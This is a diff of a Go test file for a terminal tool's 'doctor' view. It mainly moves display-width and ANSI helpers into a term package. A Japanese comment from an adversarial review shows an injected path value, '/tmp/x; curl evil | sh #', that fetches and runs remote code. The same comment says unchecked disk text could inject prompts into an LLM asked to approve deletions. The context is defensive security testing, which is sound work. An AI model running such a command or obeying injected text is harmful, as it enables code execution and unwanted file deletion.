@@ -17,6 +17,7 @@ import (
 	"doctor/disk"
 	"doctor/docker"
 	"doctor/svc"
+	"glogx/internal/term"
 )
 
 // doctorTestView は走査を fake に差し替えた doctor (実データ・実 launchd・実 brew を触らない)。
@@ -236,7 +237,7 @@ func TestDoctorLinesFillsPage(t *testing.T) {
 				t.Errorf("%s page=%d: 行数 %d", name, page, len(got))
 			}
 			for i, ln := range got {
-				if w := dispWidth(ln); w > o.width {
+				if w := term.DispWidth(ln); w > o.width {
 					t.Errorf("%s page=%d: %d 行目の幅 %d > %d", name, page, i, w, o.width)
 				}
 			}
@@ -435,7 +436,7 @@ func TestDoctorWiredThroughBrowseModel(t *testing.T) {
 	if !strings.Contains(m.hintLine(), "再スキャン") {
 		t.Errorf("doctor の hint が出ない: %q", m.hintLine())
 	}
-	if !strings.Contains(stripANSI(m.View().Content), "ディスク占有") {
+	if !strings.Contains(term.StripANSI(m.View().Content), "ディスク占有") {
 		t.Error("View が doctor を描いていない")
 	}
 	if !m.spinnerActive() {
@@ -839,7 +840,7 @@ func TestDoctorSvcAnnotationsMatchCLI(t *testing.T) {
 
 	cli := svc.Format(rep)
 	v := &doctorView{shown: true, tab: tabSvc, expanded: map[rowKey]bool{}, svcRep: &rep}
-	// 幅を広く取る: 注記が出ているかを見るテストなので、末尾切れ (truncateDisp) で落ちないようにする
+	// 幅を広く取る: 注記が出ているかを見るテストなので、末尾切れ (term.TruncateDisp) で落ちないようにする
 	// (狭い幅で注記が読めなくなる問題は issues/182 が別に扱う)
 	wide := doctorTestOpts(60)
 	wide.width = 240
@@ -1623,7 +1624,7 @@ func TestDoctorSnapshotTrustBoundarySvcAndBrew(t *testing.T) {
 // issue 178 の敵対レビュー 2 周目: サービス節の残りの穴を塞ぐ。
 //  1. Undiagnosed.PlistPath は Finding と違って形の検査が無く、`plutil -p <path>` の形で
 //     引用なしに画面へ出ていた (`/tmp/x; curl evil | sh #` がそのまま表示・コピーされる)
-//  2. 表示用の自由文でタブを明示的に通していた (dispWidth は幅 0 と数えるが端末は次のタブ位置まで
+//  2. 表示用の自由文でタブを明示的に通していた (term.DispWidth は幅 0 と数えるが端末は次のタブ位置まで
 //     進むので、幅を数えるテストを素通りしたまま枠を壊せる)
 //  3. ディスク節の自由文 (Reason / Failures / Contents) が無検査。diskCopyText は
 //     「別セッションの LLM に消してよいか聞く」形を作るので prompt injection の材料になる
@@ -1902,7 +1903,7 @@ func TestDoctorDiskRowKeepsStateAtNarrowWidth(t *testing.T) {
 		}
 		// 行はカード幅を超えない
 		for _, line := range v.lines(o) {
-			if got := dispWidth(line); got > w {
+			if got := term.DispWidth(line); got > w {
 				t.Errorf("幅 %d を超える行がある (%d 桁): %q", w, got, line)
 			}
 		}
@@ -2074,7 +2075,7 @@ func TestDoctorToastThresholdAndCooldownArePinned(t *testing.T) {
 // 🚨 守るのは 2 つ: (a) 語を出典へ委譲していること (b) **語と色の対応**。
 // 語そのものの正しさは出典側 (doctor/disk の TestMarkVocabulary) が pin する
 // (ここで語を再掲すると 2 実装に戻る) が、**色は glogx にしか無いので組で pin する**。
-// 敵対レビュー 2026-09-04: color != "" しか見ていなかったため、色を全部 ansiDim へ潰す変異も、
+// 敵対レビュー 2026-09-04: color != "" しか見ていなかったため、色を全部 term.AnsiDim へ潰す変異も、
 // 未検証条件を色側だけずらす変異も緑のまま通った (語と色が矛盾した行を作れた)。
 func TestDoctorRiskMarkDelegatesWordAndAddsColor(t *testing.T) {
 	safe := disk.Entry{ID: "e", Risk: disk.RiskSafe}
@@ -2084,15 +2085,15 @@ func TestDoctorRiskMarkDelegatesWordAndAddsColor(t *testing.T) {
 		r     disk.Result
 		color string
 	}{
-		{"blocked", disk.Result{Entry: safe, Status: disk.StatusBlocked}, ansiYellow},
-		{"failed", disk.Result{Entry: safe, Status: disk.StatusFailed}, ansiDim},
-		{"unverified", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskSafe, Unverified: "名前が未確定"}, Status: disk.StatusOK}, ansiDim},
-		{"safe", disk.Result{Entry: safe, Status: disk.StatusOK, Items: item}, ansiGreen},
+		{"blocked", disk.Result{Entry: safe, Status: disk.StatusBlocked}, term.AnsiYellow},
+		{"failed", disk.Result{Entry: safe, Status: disk.StatusFailed}, term.AnsiDim},
+		{"unverified", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskSafe, Unverified: "名前が未確定"}, Status: disk.StatusOK}, term.AnsiDim},
+		{"safe", disk.Result{Entry: safe, Status: disk.StatusOK, Items: item}, term.AnsiGreen},
 		// 🚨 「未検証だが候補は在る」= 未検証の判定は **候補 0 件のときだけ**。この組が無いと、
 		// 色側の条件から len(Items)==0 を落とす変異が緑のまま通る (敵対レビュー 2026-09-04 が実測)
-		{"unverified-with-items", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskSafe, Unverified: "名前が未確定"}, Status: disk.StatusOK, Items: item}, ansiGreen},
-		{"caution", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskCaution}, Status: disk.StatusOK, Items: item}, ansiYellow},
-		{"confirm", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskConfirm}, Status: disk.StatusOK, Items: item}, ansiRed},
+		{"unverified-with-items", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskSafe, Unverified: "名前が未確定"}, Status: disk.StatusOK, Items: item}, term.AnsiGreen},
+		{"caution", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskCaution}, Status: disk.StatusOK, Items: item}, term.AnsiYellow},
+		{"confirm", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskConfirm}, Status: disk.StatusOK, Items: item}, term.AnsiRed},
 	} {
 		word, color := doctorRiskMark(tc.r)
 		if want := disk.Mark(tc.r); word != want {
@@ -2175,7 +2176,7 @@ func TestDoctorDiskRowFitsWidthIncludingGutter(t *testing.T) {
 	// 走査が終わった状態にする (scanning のヘッダは経過時間を出すので、起点を置かないと
 	// 現実に出ない長さの行になり、測りたい行ではなくヘッダで落ちる)
 	v.svcRep, v.brew = &svc.Report{}, &brewDoctorResult{Clean: true}
-	// 🚨 「行が幅を超えない」だけを見ても**発火しない**: lines() が毎行 truncateDisp で切るので、
+	// 🚨 「行が幅を超えない」だけを見ても**発火しない**: lines() が毎行 term.TruncateDisp で切るので、
 	// 予算を誤っても溢れずに**中身が切れる**だけ (敵対レビュー 2026-09-04 の P3)。
 	// 見るのは「最長マークが切れずに残るか」= 予算が正しいかそのもの
 	for _, width := range []int{40, 53, 60, 65, 66, 67, 100} {
@@ -2199,7 +2200,7 @@ func TestDoctorMarkWidthCoversVocabulary(t *testing.T) {
 		if m == "" {
 			t.Error("空の語がある")
 		}
-		want = max(want, dispWidth(m))
+		want = max(want, term.DispWidth(m))
 	}
 	if got := doctorMaxMarkWidth(); got != want {
 		t.Errorf("最大幅 = %d; want %d (%v)", got, want, vocab)
